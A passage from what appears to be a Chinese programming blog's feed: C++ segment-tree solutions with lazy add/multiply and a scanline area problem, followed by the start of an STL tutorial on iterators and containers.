class="comment">//把子节点信息向上传递,只用传递sum</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushdown</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">     <span class="built_in">eval</span>(tr[u&lt;&lt;<span class="number">1</span>],tr[u].add,tr[u].mul),<span class="built_in">eval</span>(tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>],tr[u].add,tr[u].mul);<span class="comment">//拆分</span></span><br><span class="line">     tr[u].add=<span class="number">0</span>,tr[u].mul=<span class="number">1</span>;<span class="comment">//重置父节点的add和mul懒标记</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l==r)tr[u]=&#123;l,r,w[l],<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        tr[u]=&#123;l,r&#125;;</span><br><span class="line">        tr[u].mul=<span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid),<span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">        <span class="built_in">pushup</span>(u);<span class="comment">//更新完子节点要更新父节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r,ll ADD,ll MUL)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="built_in">eval</span>(tr[u],ADD,MUL);<span class="comment">//符合情况的直接修改add和mul和sum</span></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">pushdown</span>(u);<span class="comment">//拆分</span></span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,l,r,ADD,MUL);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r,ADD,MUL);</span><br><span class="line">        <span class="built_in">pushup</span>(u);<span class="comment">//修改完回溯更新</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">ll <span class="title">query</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)<span class="keyword">return</span> tr[u].sum;</span><br><span class="line">    <span class="built_in">pushdown</span>(u);</span><br><span class="line">    <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    ll summ=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=mid)summ=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">if</span>(r&gt;mid)summ+=<span class="built_in">query</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r);</span><br><span class="line">    <span class="keyword">return</span> summ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>,&amp;n,&amp;q,&amp;m);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)<span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;w[i]);</span><br><span class="line">    <span class="built_in">build</span> (<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">       <span class="type">int</span> t;</span><br><span class="line">        ll l,r,k;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%lld%lld&quot;</span>,&amp;t,&amp;l,&amp;r);</span><br><span class="line">        <span class="keyword">if</span>(t==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;k);</span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>,l,r,<span class="number">0</span>,k);<span class="comment">//只乘不加则add=0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(t==<span class="number">2</span>)&#123;</span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>,&amp;k);</span><br><span class="line">            <span class="built_in">modify</span>(<span class="number">1</span>,l,r,k,<span class="number">1</span>);<span class="comment">//只加不乘则mul=1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,<span class="built_in">query</span>(<span class="number">1</span>,l,r)%m);<span class="comment">//这里还是要取模</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="扫描线"><a href="#扫描线" class="headerlink" title="扫描线"></a><a href="https://www.luogu.com.cn/problem/P5490">扫描线</a></h4><ol>
<li>cnt表示当前区间整个被覆盖个数</li>
<li>len不考虑祖先节点的cnt的前提下,cnt&gt;0的区间长度</li>
</ol>
<p>每次都是查询一整个区间,所以永远在query是只用考虑根节点信息,不需要pushdown</p>
<p>所有操作成对出现,并且先加后减,并且是只用被覆盖了就好了,覆盖的次数多少对计算面积无影响</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> N=<span class="number">1e5</span>+<span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">vector&lt;ll&gt; ys;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">segment</span>&#123;</span><br><span class="line">ll x,y1,y2;</span><br><span class="line"><span class="type">int</span> k;<span class="comment">//权值</span></span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span>&lt; (<span class="type">const</span> segment &amp;t)<span class="type">const</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> x&lt;t.x;</span><br><span class="line">&#125;</span><br><span class="line">&#125;seg[N*<span class="number">2</span>];<span class="comment">//存的是点,在sort中会将点以x从小往大的顺序排序</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">node</span>&#123;</span><br><span class="line">    <span class="type">int</span> l,r,cnt;</span><br><span class="line">    ll len;<span class="comment">//在这里面存的是边,ys[tr[u].r+1]~ys[tr[u].l]的边</span></span><br><span class="line">&#125;tr[N*<span class="number">8</span>];</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(ll y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">lower_bound</span>(ys.<span class="built_in">begin</span>(),ys.<span class="built_in">end</span>(),y)-ys.<span class="built_in">begin</span>();<span class="comment">//返回第一个不小于给定值的迭代器-开头迭代器===&gt;返回元素所在位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pushup</span><span class="params">(<span class="type">int</span> u)</span></span>&#123;</span><br><span class="line">   <span class="keyword">if</span>(tr[u].cnt)tr[u].len=ys[tr[u].r+<span class="number">1</span>] -ys[tr[u].l];</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">if</span>(tr[u].l!=tr[u].r)&#123;tr[u].len=tr[u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].len+tr[u&lt;&lt;<span class="number">1</span>].len;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> tr[u].len=<span class="number">0</span>;<span class="comment">//叶节点,当cnt=0归零时,len要重置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">build</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">    tr[u]=&#123;l,r,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span>(l!=r)&#123;</span><br><span class="line">        <span class="type">int</span> mid=r+l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>,l,mid),<span class="built_in">build</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify</span><span class="params">(<span class="type">int</span> u,<span class="type">int</span> l,<span class="type">int</span> r,<span class="type">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(tr[u].l&gt;=l&amp;&amp;tr[u].r&lt;=r)&#123;</span><br><span class="line">        tr[u].cnt+=k;</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> mid=tr[u].l+tr[u].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>,l,r,k);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">modify</span>(u&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,l,r,k);</span><br><span class="line">        <span class="built_in">pushup</span>(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            ll x1,x2,y1,y2;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld%lld%lld%lld&quot;</span>,&amp;x1,&amp;y1,&amp;x2,&amp;y2);</span><br><span class="line">            seg[j++]=&#123;x1,y1,y2,<span class="number">1</span>&#125;,seg[j++]=&#123;x2,y1,y2,<span class="number">-1</span>&#125;;<span class="comment">//把所有的点都存进去</span></span><br><span class="line">            ys.<span class="built_in">push_back</span>(y1),ys.<span class="built_in">push_back</span>(y2);<span class="comment">//离散化准备</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(ys.<span class="built_in">begin</span>(),ys.<span class="built_in">end</span>());<span class="comment">//从小到大排序</span></span><br><span class="line">        ys.<span class="built_in">erase</span>(<span class="built_in">unique</span>(ys.<span class="built_in">begin</span>(),ys.<span class="built_in">end</span>()),ys.<span class="built_in">end</span>());<span class="comment">//去重,离散化完成</span></span><br><span class="line">         <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">0</span>,ys.<span class="built_in">size</span>()<span class="number">-2</span>);<span class="comment">//tr中存的是边,一共有2n个点,从零开始建树,树中的每一个节点表示的都是一个区间,最右是ys大小-2</span></span><br><span class="line">        <span class="built_in">sort</span>(seg,seg+<span class="number">2</span>*n);<span class="comment">//以x升序排序</span></span><br><span class="line">        ll res=<span class="number">0</span>;<span class="comment">//准备计数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n*<span class="number">2</span>;i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(i&gt;<span class="number">0</span>)res+=tr[<span class="number">1</span>].len*(seg[i].x-seg[i<span class="number">-1</span>].x);</span><br><span class="line">           <span class="built_in">modify</span>(<span class="number">1</span>,<span class="built_in">find</span>(seg[i].y1),<span class="built_in">find</span>(seg[i].y2)<span class="number">-1</span>,seg[i].k);<span class="comment">//右端点要减一</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,res);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ACM</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>STL_notes</title>
    <url>/ACM/stl/2024/02/07/</url>
    <content><![CDATA[<h3 id="何为STL"><a href="#何为STL" class="headerlink" title="何为STL"></a>何为STL</h3><p><strong>STL(Standard Template Library)</strong> 即<strong>标准模板库</strong>。它是一个具有工业强度，高效的C++程序库。它包含了诸多在计算机科学领域里所常用的基本数据结构和算法。这些数据结构可以与标准算法一起很好的工作，这为我们的软件开发提供了良好的支持。如果你还不理解它的重要性，那我换个说法。这就好比你去打架，你不会使用STL，那就手里的武器就相当于弹弓。敌人熟练使用STL，人家手里拿的是AK47，开着坦克。</p>
<p> #include<iostream>#include<algorithm>#include<vector>#include<queue>#include<iomanip>#include<cmath>#include<cstdio>#include<cstring>#include<map>#include<set>#include<ctime>#include<stack>using namespace std;template<typename T>inline void read(T&amp; x) {    x &#x3D; 0;    bool flg &#x3D; 0;    char c &#x3D; getchar();    for (; !isdigit(c); c &#x3D; getchar())        if (c &#x3D;&#x3D; ‘-‘)flg &#x3D; 1;    for (; isdigit(c); c &#x3D; getchar())x &#x3D; x * 10 + (c ^ 48);    if (flg)x &#x3D; -x;}c++</p>
<ul>
<li><p>迭代器(iterator)</p>
</li>
<li><p>容器(container)</p>
</li>
<li><p>算法(algorithm)</p>
</li>
<li><p>仿函数(function object)</p>
</li>
<li><p>适配器(Adaptor)</p>
</li>
<li><p>空间配制器(allocator)</p>
</li>
</ul>
<p>仿函数和空间配制器不是很常用，我们主要讨论一下迭代器，容器，算法和适配器。其中，我们以容器的用法为重点。</p>
<h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p>迭代器在STL中起着粘合剂的作用，它将算法和容器联系起来，主要用来存取容器中的元素。几乎所有的算法都是通过迭代器存取元素进行工作的。每一个容器也都定义了其本身所专有的迭代器，用以存取容器中的元素。想象一下，你面前有一缸水(缸就好比容器)，你喝水需要要到瓢(咱是文明人，不带用双手直接捧着喝的)。这个瓢就相当于迭代器，你可以用它来打水喝，也可以用瓢来把水缸装满。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;        <span class="comment">// 定义一个vector容器</span></span><br><span class="line"></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">1</span>);        <span class="comment">// 向容器中添加3个元素</span></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历向量的元素</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator b = v.<span class="built_in">begin</span>();        <span class="comment">// 指向容器的第一个元素</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt;::iterator e = v.<span class="built_in">end</span>();            <span class="comment">// 指向容器尾元素的下一个位置</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11新标准的写法, auto关键字为类型推断，由编译器自动完成</span></span><br><span class="line">    <span class="comment">// auto b = v.begin();</span></span><br><span class="line">    <span class="comment">// auto e = v.end();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator iter = b; iter != e; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>迭代器的使用，上面给了一段简单的代码，我们来精析一下。</p>
<p>迭代器最常用到的就是<strong>begin</strong>和<strong>end</strong>成员。其中begin成员负责返回指向第一个元素。end成员则负责返回指向容器的“ <strong>尾元素的下一个位置(one past the end)</strong> ”。要特别注意end成员不是指向尾元素，而是指向尾元素的下一个位置！ end成员返回的迭代器也叫尾后迭代器(off-the-end iterator)，简称尾迭代器。</p>
<p>如果容器为空呢？那么begin和end返回的是同一个迭代器，都是<strong>尾后迭代器</strong>。</p>
<p>这里要注意一下for循环的循环条件。</p>
<ul>
<li><p>初始化语句：vector<int>::iterator iter &#x3D; b; 如果你的环境支撑C++11标准，那么强烈建议你写成auto iter &#x3D; b; 即使用类型自动推断关键字auto。使用auto使程序更为简洁，也不会出错，由编译器自动推断。</p>
</li>
<li><p>条件语句 iter !&#x3D; e; 一般的for循环里我们会用itet &lt; e 这样的形式，当然，在vector里改成这样也是可以的。但是，并非所有的容器都重载了 &lt; 运算符，所有的容器都重载了&#x3D;&#x3D; 和 !&#x3D; 运算符。所以我们应该习惯使用 &#x3D;&#x3D; 和 !&#x3D; 运算符。</p>
</li>
<li><p>表达式语句 ++iter。 建议使用前置++而非后置++。 在迭代器中，前置++的效率高于后置++。实际上，除非逻辑需要，一般都使用前置++ 进行向前迭代。关于前置++和后置++的本质区别，看官可自行查看其它资料。</p>
</li>
</ul>
<p><strong>标准容器迭代器的运算符:</strong></p>
<ul>
<li><p>*iter： 返回迭代器iter所指元素的引用</p>
</li>
<li><p>iter-&gt;mem: 解引用iter并获取该元素的名为mem的成员，等价于(*item).mem</p>
</li>
<li><p>++iter: 另iter指向容器的下一个元素</p>
</li>
<li><p>–iter: 另iter指向元素的前一个元素</p>
</li>
<li><p>iter1 &#x3D;&#x3D; iter2：判断两个迭代器是否相等</p>
</li>
<li><p>iter1 !&#x3D; iter2: 判断两个迭代器是否不相等<br><strong>迭代器类型：</strong></p>
</li>
<li><p>iterator ：可读可写。</p>
</li>
<li><p>const_iterator ： 可读不可写。使用迭代器带c的版本来返回，尤其是使用auto关键字的时候。</p>
</li>
</ul>
<p><strong>迭代器的范围:</strong></p>
<p><strong>迭代器范围(iterator range)</strong> 由一对迭代器表示，最常见的就是begin和end。begin和end所表示的范围恰好是容器的全部元素。这是一个左闭合区间(left-inclusive interval),其标准的数学表达式为:</p>
<p><strong>[begin,end)</strong></p>
<p><strong>其他迭代器:</strong></p>
<p>除了为每个容器定义迭代器外，标准库在头文件 iterator中还定义了额外几种迭代器，这些迭代器包括以下几种。</p>
<ul>
<li><p>插入迭代器(insert iterator)： 这些迭代器被绑定到一个容器上，可用来向容器中插入元素。</p>
</li>
<li><p>流迭代器(stream iterator)： 这些迭代器被绑定到输入或输出流上，可用来遍历相关的IO流。</p>
</li>
<li><p>反向迭代器(reverse iterator) 这些迭代器和正常的迭代器移动方向相反。例如++操作是指向前一个元素。除了forward_list之外的标准库库容器都有反向迭代器。即<strong>迭代器的r版本</strong>。</p>
</li>
<li><p>移动迭代器(move iterator) 这些专用的迭代器不是拷贝其中的元素，而是移动它们。</p>
</li>
</ul>
<p><strong>迭代器类别:</strong></p>
<p>算法所要求的迭代器可以分为5个迭代器类别(iterator category)。</p>
<ul>
<li><p>输入迭代器 : 只读，不写。单遍扫描，只能递增。</p>
</li>
<li><p>输出迭代器 ： 只写，不读。单遍扫描，只能递增。</p>
</li>
<li><p>前向迭代器 ： 可读可写。多遍扫描，只能递增。</p>
</li>
<li><p>双向迭代器 ： 可读可写。多遍扫描，可递增递减。</p>
</li>
<li><p>随机访问迭代器 ： 可读可写。多遍扫描，支持全部迭代器运算。</p>
</li>
</ul>
<p>下面的例子演示一下迭代器的运算，c版本的迭代器，r版本的迭代器。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; v;        <span class="comment">// 定义一个vector容器</span></span><br><span class="line"></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">1</span>);        <span class="comment">// 向容器中添加5个元素</span></span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">4</span>);</span><br><span class="line">    v.<span class="built_in">push_back</span>(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用c版本的迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> b = v.<span class="built_in">cbegin</span>();    <span class="comment">// 带c版本的迭代器表示const_iterator类型的迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> e = v.<span class="built_in">cend</span>();        <span class="comment">// 指向容器尾元素的下一个位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = b; iter != e; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// *iter *= 2;            // 报错，试图给常量赋值！</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 反向输出容器中的元素，使用r版本的迭代器</span></span><br><span class="line">    <span class="keyword">auto</span> rb = v.<span class="built_in">rbegin</span>();        <span class="comment">// 实际指向尾元素</span></span><br><span class="line">    <span class="keyword">auto</span> re = v.<span class="built_in">rend</span>();            <span class="comment">// 指向第一个元素的前一个位置</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> iter = rb; iter != re; ++iter)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; *iter &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 进行迭代器的运算，输出容器的中间元素</span></span><br><span class="line">    <span class="keyword">auto</span> mid = v.<span class="built_in">begin</span>() + v.<span class="built_in">size</span>() / <span class="number">2</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;该容器的中间元素为:&quot;</span> &lt;&lt; *mid &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h3><p>容器的定义是：<strong>特定类型对象的集合。</strong></p>
<p>在没有使用容器之前，我们可能会用数组解决一些问题。使用数组解决问题，那么我们必须要知道或者估算出大约要存储多少个对象，这样我们会创建能够容纳这些对象的内存空间大小。当我们要处理一些完全不知道要存储多少对象的问题时，数组显的力不从心。我们可以使用容器来解决这个问题。容器具有很高的可扩展性，我们不需要预先告诉它要存储多少对象，只要创建一个容器，并合理的调用它所提供的方法，所有的处理细节由容器自身完成。</p>
<blockquote>
<p>新标准库的容器的性能几乎肯定与最精心优化过的同类数据结构一样好(通常会更好)。现代C++程序应该使用标准容器库，而不是更原始的数据结构，如内置数组。</p>
</blockquote>
<p><strong>通用容器的分类</strong></p>
<p>通用容器分为3类：顺序容器、关联容器、容器适配器。</p>
<p><strong>顺序容器</strong></p>
<p>顺序容器是一种元素之间有顺序的线性表，是一种线性结构的可序群集。这和我们数据结构课程上所讲的线性表是一样的。顺序容器中的每个元素位置是固定的，除非你使用了插入或者删除操作改变了这个位置。顺序容器不会根据元素的特点排序而是直接保存了元素操作时的逻辑顺序。比如我们一次性对一个顺序容器追加三个元素，这三个元素在容器中的相对位置和追加时的逻辑次序是一致的。</p>
<p>顺序容器都提供了快速顺序访问元素的能力。但是，他们在以下方面都有不同的性能折中：</p>
<ul>
<li><p>向容器中添加或者向容器中删除元素的代价。(不是末端)</p>
</li>
<li><p>非顺序访问容器中元素的代价。</p>
</li>
</ul>
<p><strong>顺序容器的类型：</strong></p>
<ul>
<li><p>vector : 可变大小数组，支持快速随机访问。在尾部之外的位置插入或者删除元素可能很慢。</p>
</li>
<li><p>deque : 双端队列。支持快速随机访问。在头尾位置插入、删除速度很快。</p>
</li>
<li><p>list : 双向链表。只支持双向顺序访问。在list中任何位置进行插入、删除操作速度都很快。</p>
</li>
<li><p>forward_list : 单向链表。只支持单向顺序访问。在链表的任何位置进行插入、删除操作都很快。(C++11标准新加)</p>
</li>
<li><p>array : 固定大小数组。支持快速随机访问。不能添加或者删除元素。(C++11标准新加)</p>
</li>
<li><p>string : 与vector相似的容器，但专门用于保存字符。随机访问快，在尾部插入删除快。</p>
</li>
</ul>
<p>如何选择呢？是不是又犯了选择困难症？ 我们一般对症下药，了解这些容器的特性，根据自己的编程需求选择适合的容器。vector、deque和list这三者我们可以优先考虑vector。vector容器适用于大量读写，而插入、删除比较少的操作。list容器适用于少量读写，大量插入，删除的情况。deque折中了vector和deque， 如果你需要随机存取又关心数据的插入和删除，那么可以选择deque。forward_list适用于符合它这种逻辑结构的情况，array一般用来代替原生的数组。string用于和字符串操作有关的一些情况，也是实际开发中应用最多的。</p>
<p>关于各容器的操作，实在是太多了，下面的示例程序列举一些比较常见的操作和用法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;deque&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;forward_list&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;array&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*--------------------- vector容器的一些操作  ------------------*/</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vect1;            <span class="comment">// 定义一个vector容器</span></span><br><span class="line">    vect1.<span class="built_in">push_back</span>(<span class="number">1</span>);            <span class="comment">// push_back: 向容器的末尾添加元素</span></span><br><span class="line">    vect1.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    vect1.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line">    vect1.<span class="built_in">pop_back</span>();            <span class="comment">// pop_back: 去除末尾的元素</span></span><br><span class="line"></span><br><span class="line">    vect1.<span class="built_in">insert</span>(vect1.<span class="built_in">begin</span>() + <span class="number">1</span>, <span class="number">8</span>);    <span class="comment">// 在某个位置插入一个元素,效率低，不适合大批操作</span></span><br><span class="line">    vect1.<span class="built_in">at</span>(<span class="number">0</span>);                        <span class="comment">// at:取某个位置的元素</span></span><br><span class="line">    vect1.<span class="built_in">capacity</span>();                    <span class="comment">// capacity: 不分配新的内存空间的前提下它最多能保存多少元素。这个和下面的size 是有区别的！！</span></span><br><span class="line">    vect1.<span class="built_in">size</span>();                        <span class="comment">// size: 已经保存的元素的数目</span></span><br><span class="line">    vect1.<span class="built_in">empty</span>();                        <span class="comment">// empty：判断容器是否为空</span></span><br><span class="line">    vect1.<span class="built_in">front</span>();                        <span class="comment">// front：取第一个元素</span></span><br><span class="line">    vect1.<span class="built_in">back</span>();                        <span class="comment">// back：取最后一个元素</span></span><br><span class="line">    vect1.<span class="built_in">erase</span>(vect1.<span class="built_in">begin</span>() + <span class="number">1</span>);        <span class="comment">// erase：删除指定位置的元素</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; vect2;</span><br><span class="line">    vect2.<span class="built_in">assign</span>(vect1.<span class="built_in">begin</span>(), vect1.<span class="built_in">end</span>()); <span class="comment">// 赋值操作</span></span><br><span class="line">    <span class="comment">/*------------------------------------------------------------*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他容器操作都和vector差不多，以下列举一些其他容器特有的操作</span></span><br><span 